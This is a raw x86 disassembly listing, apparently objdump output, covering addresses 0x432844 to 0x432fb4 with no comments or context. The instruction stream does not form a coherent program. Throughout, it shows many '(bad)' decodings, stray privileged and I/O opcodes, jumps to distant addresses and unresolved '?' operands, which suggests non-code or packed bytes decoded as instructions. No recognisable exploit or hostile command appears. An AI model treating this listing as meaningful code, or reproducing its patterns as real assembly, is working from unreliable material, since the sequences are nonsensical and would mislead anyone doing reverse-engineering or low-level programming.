  432844:	add    BYTE PTR [ebp+0x0],al
  432847:	add    eax,0x86
  43284c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432852:	add    BYTE PTR [ecx],al
  432854:	add    BYTE PTR [eax],al
  432856:	mov    esi,0x550030
  43285b:	mov    ecx,DWORD PTR [edi]
  43285d:	cld    
  43285e:	fidiv  DWORD PTR [ebp+0x0]
  432861:	mov    edi,DWORD PTR [ecx]
  432863:	xor    BYTE PTR [eax+eax*1],0x84
  432867:	add    eax,DWORD PTR [eax]
  432869:	sbb    BYTE PTR [eax],al
  43286b:	jne    0x43281e
  43286d:	mov    eax,DWORD PTR [ecx]
  43286f:	sbb    BYTE PTR [eax],al
  432871:	mov    DWORD PTR [ebp-0x1],esp
  432874:	add    BYTE PTR [eax+0x30e45ca],bh
  43287a:	ret    0xb7fc
  43287d:	dec    ebp
  43287e:	or     al,0x89
  432880:	dec    ebp
  432881:	cld    
  432882:	cmovne ecx,DWORD PTR [eax-0x75]
  432886:	add    edi,esp
  432888:	seto   BYTE PTR [esi-0x72ffffff]
  43288f:	inc    ebp
  432890:	adc    al,0x8b
  432892:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432899:	cmp    DWORD PTR [edi+0x72],edx
  43289c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4328a2:	gs cmp al,0x0
  4328a5:	je     0x43287d
  4328a7:	push   eax
  4328a8:	sar    BYTE PTR [eax],1
  4328aa:	mov    bh,0x3e
  4328ac:	push   cs
  4328ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4328b3:	add    DWORD PTR [ecx+0x12],ebp
  4328b6:	dec    edx
  4328b7:	(bad)  
  4328b8:	mov    eax,edx
  4328ba:	in     al,dx
  4328bb:	adc    DWORD PTR [ecx],esi
  4328bd:	pop    esi
  4328be:	inc    ecx
  4328bf:	leave  
  4328c0:	or     DWORD PTR [eax],ebx
  4328c2:	gs push ebp
  4328c4:	add    ah,ch
  4328c6:	into   
  4328c7:	in     al,dx
  4328c8:	enter  0xb756,0xf0
  4328cc:	push   cs
  4328cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4328d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4328dd:	jnp    0x7443ade5
  4328e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4328e9:	add    BYTE PTR [edi],cl
  4328eb:	mov    edi,DWORD PTR [ecx-0x78]
  4328ee:	ltr    WORD PTR [ecx-0x7b]
  4328f2:	dec    DWORD PTR [edi]
  4328f4:	clc    
  4328f5:	out    0x45,eax
  4328f7:	add    BYTE PTR [eax],cl
  4328f9:	cmp    ebx,0xffffff8c
  4328fc:	jge    0x4328fe
  4328fe:	jb     0x432910
  432900:	je     0x522980
  432906:	pop    edx
  432907:	push   esi
  432908:	mov    ecx,DWORD PTR [edi]
  43290a:	in     al,dx
  43290b:	rol    DWORD PTR [ebp+0x0],1
  43290e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432915:	cmp    DWORD PTR [ecx],0xfffffff0
  432918:	hlt    
  432919:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43291f:	(bad)  
  432921:	push   eax
  432922:	jns    0xb8430da0
  432928:	lock push cs
  43292a:	ror    edx,0x3
  43292d:	test   BYTE PTR [ecx+0x5500e800],cl
  432933:	dec    eax
  432934:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432938:	(bad)  
  432939:	mov    esi,0x7f33ff5f
  43293e:	inc    eax
  43293f:	test   DWORD PTR [edx],eax
  432941:	je     0x432903
  432943:	mov    ecx,ecx
  432945:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432949:	and    eax,DWORD PTR [eax+0xf0103]
  43294f:	jp     0x43293d
  432951:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432955:	add    edx,DWORD PTR [edi+0x74]
  432958:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43295e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432964:	je     0x4328e9
  432966:	cmp    eax,edi
  432968:	js     0x43298d
  43296a:	add    eax,0xeb0fc003
  43296f:	jns    0x4328fc
  432971:	vmread DWORD PTR [ecx+0x45],ebx
  432975:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43297b:	adc    al,0x8b
  43297d:	jge    0x432993
  43297f:	mov    edi,DWORD PTR [eax-0x4]
  432982:	add    edi,DWORD PTR [edi]
  432984:	or     bh,bh
  432986:	push   ebp
  432987:	push   es
  432988:	mov    DWORD PTR [ebp-0x4],ebx
  43298b:	add    edi,esi
  43298d:	pop    es
  43298e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432994:	mov    DWORD PTR [esp+esi*8],ecx
  432997:	inc    ebp
  432998:	pop    ebp
  432999:	xor    DWORD PTR [esi-0x4],0x3b
  43299d:	add    edx,DWORD PTR [ecx+edi*1]
  4329a0:	push   es
  4329a1:	clc    
  4329a2:	mov    bh,0xdb
  4329a4:	jp     0x43295d
  4329a6:	add    cl,BYTE PTR [esi]
  4329a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4329ae:	test   edi,edi
  4329b0:	je     0x4329a6
  4329b2:	mov    eax,ecx
  4329b4:	or     BYTE PTR [ebx],al
  4329b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4329bc:	jbe    0x432a30
  4329be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4329c4:	add    ecx,DWORD PTR [esi]
  4329c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4329cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4329d2:	je     0x432a21
  4329d4:	mov    DWORD PTR [ecx],edi
  4329d6:	mov    esi,eax
  4329d8:	hlt    
  4329d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4329e0:	jb     0x4329a2
  4329e2:	jmp    0x4329cf
  4329e4:	xor    esi,DWORD PTR [ebx]
  4329e6:	pop    edi
  4329e7:	pop    esi
  4329e8:	pop    ebx
  4329e9:	ret    
  4329ea:	ret    0x8b
  4329ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4329f3:	xor    DWORD PTR [esi],0xc
  4329f6:	pushf  
  4329f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4329fd:	(bad)  
  4329ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a06:	dec    ebp
  432a07:	ret    
  432a08:	mov    edi,DWORD PTR [esi-0x4]
  432a0b:	pop    eax
  432a0c:	dec    ebp
  432a0d:	jne    0x43299a
  432a0f:	xor    edi,esp
  432a11:	inc    eax
  432a12:	dec    ebp
  432a13:	jbe    0x432a68
  432a15:	inc    eax
  432a16:	pop    ebp
  432a17:	add    edx,DWORD PTR [esi+0x8]
  432a1a:	push   ecx
  432a1b:	dec    eax
  432a1c:	push   ecx
  432a1d:	mov    eax,edi
  432a1f:	and    al,0xf0
  432a21:	jo     0x432a0e
  432a23:	mov    eax,DWORD PTR [ebx]
  432a25:	sbb    BYTE PTR [ebp+0x4d],cl
  432a28:	mov    eax,DWORD PTR [ebx]
  432a2a:	nop
  432a2b:	or     BYTE PTR [eax],al
  432a2d:	jne    0x432a86
  432a2f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432a35:	cld    
  432a36:	xor    edi,edi
  432a38:	add    edi,DWORD PTR [ebp+0x3]
  432a3b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432a41:	js     0x4329c7
  432a43:	jae    0x432a47
  432a45:	(bad)  
  432a47:	xor    al,0x5d
  432a49:	jmp    0x4329d6
  432a4b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432a52:	fdecstp 
  432a54:	test   BYTE PTR [edi],ah
  432a56:	add    bh,BYTE PTR [ebp+0x0]
  432a59:	add    ebx,DWORD PTR [ebp-0x77]
  432a5c:	mov    edi,eax
  432a5e:	cmp    al,0x0
  432a61:	adc    dh,BYTE PTR [ebx]
  432a63:	jge    0x432a68
  432a65:	mov    edi,DWORD PTR [ebx]
  432a67:	jl     0x432a78
  432a69:	clc    
  432a6a:	dec    edi
  432a6b:	jge    0x432a6d
  432a6d:	mov    eax,DWORD PTR [ebx]
  432a6f:	jb     0x432a79
  432a71:	mov    ecx,DWORD PTR [ebp-0x8]
  432a74:	mov    edi,edi
  432a76:	xor    edx,DWORD PTR [eax]
  432a78:	add    edi,DWORD PTR [ebx]
  432a7a:	mov    DWORD PTR [ebp-0x10],edi
  432a7d:	inc    edi
  432a7e:	pop    ebp
  432a7f:	jge    0x432abc
  432a81:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432a85:	mov    edx,0xc05d87f0
  432a8a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432a8e:	fimul  WORD PTR [eax]
  432a90:	fist   WORD PTR [ebp+0x1c]
  432a93:	in     al,dx
  432a94:	jne    0x432a82
  432a96:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432a9c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432aa0:	fdivp  st(0),st
  432aa2:	fild   WORD PTR [ebp+0x4510f85c]
  432aa8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432aae:	inc    ebp
  432aaf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432ab5:	mov    ebp,DWORD PTR [ebx-0x4]
  432ab8:	adc    al,0x8b
  432aba:	rcl    DWORD PTR [eax],0x48
  432abd:	mov    esi,0x7080803
  432ac2:	fiadd  WORD PTR [ebp+0x4d]
  432ac5:	mov    WORD PTR [ebx+0x558bfc52],cs
  432acb:	cld    
  432acc:	xor    ebx,DWORD PTR [ebx+0x330103]
  432ad2:	mov    DWORD PTR [edi+0x872dc],edi
  432ad8:	xlat   BYTE PTR ds:[ebx]
  432ad9:	into   
  432ada:	ffreep st(6)
  432adc:	retf   0x6c7
  432adf:	iret   
  432ae0:	dec    ebp
  432ae1:	inc    ebp
  432ae2:	mov    DWORD PTR [ebx],edi
  432ae4:	fmul   QWORD PTR [edi]
  432ae6:	dec    ebp
  432ae7:	jnp    0x432b1c
  432ae9:	add    BYTE PTR [ebx],al
  432aeb:	mov    ecx,DWORD PTR [esp+edi*8]
  432aee:	inc    ebp
  432aef:	dec    ebp
  432af0:	lea    esi,[ebx]
  432af2:	add    DWORD PTR [ebx],eax
  432af4:	jb     0x432b31
  432af6:	add    BYTE PTR [edi],cl
  432af8:	inc    ebp
  432af9:	imul   eax,edi,0x858bd800
  432aff:	cld    
  432b00:	clc    
  432b01:	mov    DWORD PTR [ebp+0x0],eax
  432b04:	inc    DWORD PTR [eax]
  432b06:	or     al,0xde
  432b08:	sbb    bh,0x1
  432b0b:	retf   
  432b0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b13:	dec    ebp
  432b14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b1a:	enter  0x12de,0xdf
  432b1e:	inc    ebp
  432b1f:	pop    ebp
  432b20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432b26:	add    DWORD PTR [edx],edx
  432b28:	add    BYTE PTR [ebp+0x50],dl
  432b2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432b31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432b37:	or     ah,al
  432b39:	pop    ss
  432b3a:	cdq    
  432b3b:	push   ebp
  432b3c:	clc    
  432b3d:	mov    eax,DWORD PTR [ebp-0x4]
  432b40:	xor    edx,edx
  432b42:	add    esi,DWORD PTR [ebx]
  432b44:	cmp    eax,DWORD PTR [ebx]
  432b46:	hlt    
  432b47:	cmp    DWORD PTR [ebx],esp
  432b49:	or     al,BYTE PTR [ebp+0xf]
  432b4c:	mov    eax,DWORD PTR [edx]
  432b4e:	loopne 0x432b50
  432b50:	(bad)  
  432b51:	mov    ecx,esi
  432b53:	cld    
  432b54:	pushf  
  432b55:	pop    ebp
  432b56:	cdq    
  432b57:	mov    esi,DWORD PTR [edx]
  432b59:	lock mov eax,eax
  432b5c:	adc    BYTE PTR [ebx],al
  432b5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432b65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432b6b:	dec    ebp
  432b6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432b72:	(bad)  
  432b73:	iret   
  432b74:	inc    ebp
  432b75:	(bad)  
  432b76:	jne    0x432bc5
  432b78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432b7e:	(bad)  
  432b7f:	cmp    ebx,eax
  432b81:	je     0x432b09
  432b83:	add    edi,edi
  432b85:	or     bh,bh
  432b87:	dec    ebp
  432b88:	inc    ebp
  432b89:	mov    esi,DWORD PTR [ebx]
  432b8b:	cld    
  432b8c:	add    ecx,esi
  432b8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432b91:	mov    edx,DWORD PTR [edi]
  432b93:	or     BYTE PTR [ebp-0x7c],al
  432b96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432b9c:	test   BYTE PTR [ecx+ebx*4],cl
  432b9f:	inc    ebp
  432ba0:	xor    bh,BYTE PTR ds:0x8be89c89
  432ba6:	out    dx,eax
  432ba7:	adc    BYTE PTR [eax],al
  432ba9:	jne    0x432b72
  432bab:	mov    ebp,esp
  432bad:	fcomp  DWORD PTR [ebx]
  432baf:	add    BYTE PTR [ecx],al
  432bb1:	inc    DWORD PTR [ebp-0x75]
  432bb4:	mov    esp,?
  432bb6:	add    al,0xce
  432bb8:	mov    ecx,edi
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	fidivr WORD PTR [ebx]
  432bbe:	fbstp  TBYTE PTR [ebp-0x3e]
  432bc1:	mov    eax,DWORD PTR [eax]
  432bc3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432bc9:	fadd   st,st(7)
  432bcb:	add    BYTE PTR [ebp-0x1],al
  432bce:	mov    ecx,DWORD PTR [esp+edi*8]
  432bd1:	inc    ebp
  432bd2:	mov    bh,0xc7
  432bd5:	loopne 0x432c1c
  432bd7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432bdd:	add    DWORD PTR [ebx],esi
  432bdf:	pushf  
  432be0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432be6:	mov    eax,edi
  432be8:	cwde   
  432be9:	inc    ebp
  432bea:	inc    ebp
  432beb:	jne    0x432b78
  432bed:	mov    esp,esp
  432bef:	clc    
  432bf0:	add    al,0x4d
  432bf2:	mov    DWORD PTR [ebx],esi
  432bf4:	or     al,0x33
  432bf6:	inc    ebp
  432bf7:	lea    ecx,[ebx-0x398d13fd]
  432bfd:	add    bh,al
  432bff:	inc    ebp
  432c00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c07:	add    ebp,esp
  432c09:	shufps xmm1,xmm3,0xc7
  432c0d:	(bad)  
  432c0e:	jmp    0x74886737
  432c13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c19:	hlt    
  432c1a:	mov    ecx,DWORD PTR [edi]
  432c1c:	fadd   DWORD PTR [ebp+0x0]
  432c1f:	xor    ecx,DWORD PTR [edi]
  432c21:	add    ecx,ecx
  432c23:	cmp    edi,edi
  432c25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432c29:	(bad)  
  432c2a:	jmp    0x432bb7
  432c2c:	mov    edi,esp
  432c2e:	or     al,0xc6
  432c30:	inc    ebp
  432c31:	(bad)  
  432c32:	mov    eax,DWORD PTR [ebp+0x10]
  432c35:	jne    0x432bc0
  432c37:	mov    eax,DWORD PTR [ecx]
  432c39:	clc    
  432c3a:	add    BYTE PTR [ebp-0x40],cl
  432c3d:	xor    edx,DWORD PTR [eax-0x73]
  432c40:	jne    0x432c43
  432c42:	push   DWORD PTR [edx+0x8]
  432c45:	add    BYTE PTR [ebp+0x45],al
  432c48:	mov    ebp,ecx
  432c4a:	cld    
  432c4b:	add    BYTE PTR [ebp+0x0],cl
  432c4e:	xor    eax,DWORD PTR [ebp+0x3]
  432c51:	mov    ?,WORD PTR [ebx]
  432c53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432c59:	sub    eax,0x5d330e4d
  432c5e:	lea    esi,[ebx]
  432c60:	add    DWORD PTR [ebx],eax
  432c62:	jb     0x432c4d
  432c64:	add    BYTE PTR [eax],al
  432c66:	inc    ebp
  432c67:	add    bl,ch
  432c69:	inc    ebp
  432c6a:	mov    esi,DWORD PTR [ebx]
  432c6c:	or     al,0x3
  432c6e:	(bad)  
  432c6f:	mov    edi,eax
  432c71:	in     al,dx
  432c72:	scas   eax,DWORD PTR es:[edi]
  432c73:	inc    ebp
  432c74:	mov    esi,DWORD PTR [ebx]
  432c76:	in     al,0x3
  432c78:	add    al,0x89
  432c7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432c7d:	dec    ebp
  432c7e:	(bad)  
  432c7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432c86:	mov    ecx,eax
  432c88:	cld    
  432c89:	push   es
  432c8a:	dec    ebp
  432c8b:	add    al,0x33
  432c8d:	mov    DWORD PTR [ebx],eax
  432c8f:	in     al,dx
  432c90:	cmp    DWORD PTR [ebp-0x67],eax
  432c93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432c99:	mov    edx,DWORD PTR [ebp-0x4]
  432c9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432c9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ca2:	cmp    DWORD PTR [ebx],0x8b327498
  432ca8:	xor    edi,esp
  432caa:	jmp    0xff7729fc
  432caf:	add    ecx,DWORD PTR [ebp-0x3f]
  432cb2:	xor    ebx,DWORD PTR [edi]
  432cb4:	add    eax,ecx
  432cb6:	cmp    ebx,DWORD PTR [eax]
  432cb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432cbb:	mov    ecx,DWORD PTR [eax]
  432cbd:	adc    BYTE PTR [ebp-0x80],al
  432cc0:	jmp    0x432cc3
  432cc2:	mov    eax,DWORD PTR [eax]
  432cc4:	cld    
  432cc5:	mov    bh,0xc6
  432cc7:	push   ecx
  432cc8:	(bad)  
  432cc9:	jne    0x432d29
  432ccb:	dec    ecx
  432ccd:	or     BYTE PTR [ecx+ebx*1],cl
  432cd0:	push   ebp
  432cd1:	inc    ebp
  432cd2:	in     al,dx
  432cd3:	add    ebp,esp
  432cd5:	or     bh,al
  432cd7:	dec    ebp
  432cd8:	cld    
  432cd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432cdf:	cmp    DWORD PTR [ecx],0x2
  432ce2:	pushf  
  432ce3:	dec    DWORD PTR [ebx+0x45510cf4]
  432ce9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432cef:	mov    edx,DWORD PTR [ecx+0xc]
  432cf2:	xor    eax,esi
  432cf4:	mov    edx,0xc172c7
  432cf9:	inc    ebp
  432cfa:	mov    esi,DWORD PTR [ebp+0x8]
  432cfd:	mov    eax,edx
  432cff:	call   0x84c7f3f4
  432d04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d0a:	mov    ebp,eax
  432d0c:	or     BYTE PTR [eax],dl
  432d0e:	jo     0x432d5d
  432d10:	push   edi
  432d11:	xor    esi,DWORD PTR [ebp+0x3]
  432d14:	(bad)  
  432d15:	pmulhuw mm0,mm1
  432d18:	test   DWORD PTR [ebp-0x8],ecx
  432d1b:	mov    DWORD PTR [ebp-0x67],eax
  432d1e:	mov    eax,DWORD PTR [ebp-0x4]
  432d21:	xor    edi,DWORD PTR [ebp-0x73]
  432d24:	xor    eax,DWORD PTR [ebx]
  432d26:	xor    esi,DWORD PTR [edx+0x3]
  432d29:	add    BYTE PTR [ecx],bh
  432d2b:	inc    ebp
  432d2c:	(bad)  
  432d2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432d33:	mov    DWORD PTR [eax],0x750f0004
  432d39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432d3f:	lock add BYTE PTR [ebp+0x0],cl
  432d43:	mov    esi,DWORD PTR [ebp-0x18]
  432d46:	mov    ebp,edx
  432d48:	or     al,0x72
  432d4a:	ja     0x432d4c
  432d4c:	mov    edx,esi
  432d4e:	cld    
  432d4f:	(bad)  
  432d52:	cli    
  432d53:	mov    esi,DWORD PTR [ebp-0x4]
  432d56:	cmp    ecx,esi
  432d58:	bswap  edi
  432d5a:	(bad)
  432d5e:	mov    esi,DWORD PTR [ebp-0x4]
  432d61:	mov    esi,ecx
  432d63:	clc    
  432d64:	repnz add esi,DWORD PTR [ebp+0x45]
  432d68:	push   ebx
  432d69:	xor    eax,DWORD PTR [ebp+0x3]
  432d6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432d6f:	pop    ebx
  432d70:	jmp    0x432e37
  432d75:	mov    esi,DWORD PTR [ebp-0x7d]
  432d78:	xor    ebp,DWORD PTR [eax]
  432d7a:	lea    eax,[ebp-0x8]
  432d7d:	ss repnz pushf 
  432d80:	out    dx,eax
  432d81:	(bad)  
  432d82:	neg    eax
  432d84:	ins    DWORD PTR es:[edi],dx
  432d85:	test   esi,edi
  432d87:	clc    
  432d88:	pop    esp
  432d89:	inc    ebp
  432d8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432d90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432d96:	add    cl,al
  432d98:	jne    0x432d33
  432d9a:	mov    esi,DWORD PTR [edx]
  432d9c:	in     al,dx
  432d9d:	push   esi
  432d9e:	xor    BYTE PTR [ebp-0xe],dh
  432da1:	add    edi,esi
  432da3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432da9:	add    cl,bh
  432dab:	mov    edi,DWORD PTR [ebp+0x8]
  432dae:	mov    DWORD PTR [ebp-0x14],esi
  432db1:	add    esi,DWORD PTR [ebp+0x3c]
  432db4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432dba:	mov    ah,0x3d
  432dbc:	cdq    
  432dbd:	pushf  
  432dbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432dc4:	jne    0x432d51
  432dc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432dc9:	icebp  
  432dca:	icebp  
  432dcb:	shl    edx,0xf2
  432dce:	(bad)  
  432dcf:	mov    ah,0x16
  432dd1:	inc    eax
  432dd2:	jne    0x432d67
  432dd4:	mov    ecx,DWORD PTR [edi]
  432dd6:	in     al,dx
  432dd7:	jmp    0x432dca
  432dd9:	add    dl,dh
  432ddb:	mov    edi,esi
  432ddd:	or     al,0x8
  432ddf:	inc    ebp
  432de0:	jne    0x432de5
  432de2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432de8:	ret    
  432de9:	or     bh,bh
  432deb:	jge    0x432dd5
  432ded:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432df3:	xor    edi,eax
  432df5:	add    esi,DWORD PTR [ebp-0x77]
  432df8:	mov    ebx,esp
  432dfa:	clc    
  432dfb:	neg    DWORD PTR [ebp-0x7c]
  432dfe:	xor    eax,DWORD PTR [eax]
  432e00:	cmp    eax,DWORD PTR [eax]
  432e02:	repz jne 0x432d9a
  432e05:	xor    eax,DWORD PTR [ecx]
  432e07:	add    ebx,DWORD PTR [eax]
  432e09:	mov    DWORD PTR [ebp-0x8],eax
  432e0c:	mov    eax,edi
  432e0e:	cld    
  432e0f:	lock pop eax
  432e11:	test   DWORD PTR [ebx],esi
  432e13:	clc    
  432e14:	add    edx,DWORD PTR [edi-0x740bff77]
  432e1a:	fdivp  st(4),st
  432e1c:	test   ecx,esi
  432e1e:	(bad)  
  432e1f:	jnp    0x432e20
  432e21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432e27:	jae    0x432db4
  432e29:	sub    edi,esp
  432e2b:	(bad)  
  432e2c:	shl    DWORD PTR [eax-0x3e],0x89
  432e30:	leave  
  432e31:	call   0x8198e53e
  432e36:	in     al,dx
  432e37:	(bad)  
  432e38:	in     al,dx
  432e39:	add    bh,al
  432e3b:	mov    esp,edi
  432e3d:	in     al,dx
  432e3e:	test   DWORD PTR [ebp-0x8],edi
  432e41:	mov    eax,DWORD PTR [ebp+0x2b]
  432e44:	cmp    DWORD PTR [ebx],eax
  432e46:	pushf  
  432e47:	jnp    0x57322a80
  432e4d:	xor    edx,DWORD PTR [ecx-0x77]
  432e50:	push   ecx
  432e51:	loopne 0x432e86
  432e53:	jne    0x432e10
  432e55:	mov    esi,DWORD PTR [edx-0x20]
  432e58:	add    BYTE PTR [ebp-0x3d],bh
  432e5b:	xor    eax,DWORD PTR [ebp-0x73]
  432e5e:	mov    edi,DWORD PTR [esi]
  432e60:	cld    
  432e61:	jb     0x432e29
  432e63:	add    bl,al
  432e65:	jne    0x432eac
  432e67:	mov    edx,DWORD PTR [edi-0x10]
  432e6a:	jge    0x432ee9
  432e6c:	mov    esi,DWORD PTR [ebx]
  432e6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432e72:	xor    esi,DWORD PTR [ebp-0x77]
  432e75:	mov    esi,eax
  432e77:	lock inc ebp
  432e79:	jge    0x432eb1
  432e7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432e82:	dec    ebp
  432e83:	mov    esi,DWORD PTR [ebx]
  432e85:	loopne 0x432e10
  432e87:	jge    0x432e81
  432e89:	add    DWORD PTR [ebp-0x7d],eax
  432e8c:	test   BYTE PTR [edx],0x9c
  432e8f:	dec    ebp
  432e90:	mov    esi,DWORD PTR [ebp-0xc]
  432e93:	mov    ecx,DWORD PTR [ebp-0xc]
  432e96:	xor    ebx,DWORD PTR [ebp-0x77]
  432e99:	mov    esi,esp
  432e9b:	in     al,0x45
  432e9d:	jge    0x432ed9
  432e9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432ea6:	dec    ebp
  432ea7:	inc    esp
  432ea8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432eae:	inc    ebp
  432eaf:	hlt    
  432eb0:	ss jne 0x432e52
  432eb3:	mov    edi,DWORD PTR [eax+0xf19504]
  432eb9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432ebd:	cmp    eax,DWORD PTR [ebp+0xf]
  432ec0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432ec4:	fistp  WORD PTR [ebx+0x0]
  432ec7:	inc    ebp
  432ec8:	mov    ebx,DWORD PTR [edi+0xc]
  432ecb:	add    eax,eax
  432ecd:	inc    ebp
  432ece:	test   BYTE PTR [ebx],dh
  432ed0:	add    eax,DWORD PTR [ebx]
  432ed2:	add    BYTE PTR [esi+0x45],bl
  432ed5:	ret    0x85
  432ed8:	jnp    0x5443b2a7
  432ede:	inc    bp
  432ee0:	inc    ebp
  432ee1:	ss mov ecx,0xc78a9c
  432ee7:	fdiv   QWORD PTR [ebx]
  432ee9:	test   DWORD PTR [ecx+0x453af8],edi
  432eef:	push   ebx
  432ef0:	add    edi,DWORD PTR [esi+0x708088b]
  432ef6:	cmp    esi,eax
  432ef8:	setns  BYTE PTR [ecx-0x74fcffce]
  432eff:	mov    esp,edi
  432f01:	call   0x33ce7453
  432f06:	or     BYTE PTR [ebx],al
  432f08:	inc    ecx
  432f09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f15:	lock add cl,al
  432f18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f1f:	mov    ch,0x45
  432f21:	clc    
  432f22:	xor    eax,DWORD PTR [ebp+0x3]
  432f25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432f2b:	inc    ebp
  432f2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432f32:	mov    edi,eax
  432f34:	mov    eax,DWORD PTR [ebp+0x3c]
  432f37:	mov    ecx,DWORD PTR [eax]
  432f39:	hlt    
  432f3a:	inc    ebp
  432f3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432f42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432f48:	push   ebp
  432f49:	mov    edi,DWORD PTR [ebx]
  432f4b:	in     al,dx
  432f4c:	jne    0x432f0f
  432f4e:	mov    eax,DWORD PTR [ebp-0x28]
  432f51:	add    DWORD PTR [eax],0xe8058dec
  432f57:	clc    
  432f58:	mov    esi,DWORD PTR [edi-0x8]
  432f5b:	add    dh,dl
  432f5d:	rol    WORD PTR [ebp-0x1],cl
  432f61:	mov    edx,DWORD PTR [eax+0x8]
  432f64:	jne    0x432f26
  432f66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432f6d:	inc    ebp
  432f6e:	push   esp
  432f6f:	test   DWORD PTR [ecx+0xf],ecx
  432f72:	sub    edx,esp
  432f74:	add    eax,DWORD PTR [eax]
  432f76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432f7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432f83:	mov    eax,DWORD PTR [ecx]
  432f85:	and    BYTE PTR [eax],al
  432f87:	cmp    BYTE PTR [eax],dl
  432f89:	add    BYTE PTR [ebp+0x66],al
  432f8c:	inc    ecx
  432f8e:	push   esp
  432f8f:	(bad)  
  432f90:	jne    0x432f92
  432f92:	push   edx
  432f93:	enterw 0xc1,0x4d
  432f98:	mov    esp,DWORD PTR [esi+0x20]
  432f9b:	add    DWORD PTR [ecx-0x7b],eax
  432f9e:	add    eax,DWORD PTR [ebx]
  432fa0:	str    WORD PTR [eax+0x45]
  432fa4:	lea    ecx,[ebx+0x45890801]
  432faa:	sbb    BYTE PTR [ebx],al
  432fac:	dec    ebp
  432fad:	cmp    al,0xf
  432faf:	inc    ebp
  432fb0:	push   eax
  432fb1:	mov    esi,DWORD PTR [ebx]
  432fb3:	push   eax
  432fb4:	add    eax,eax
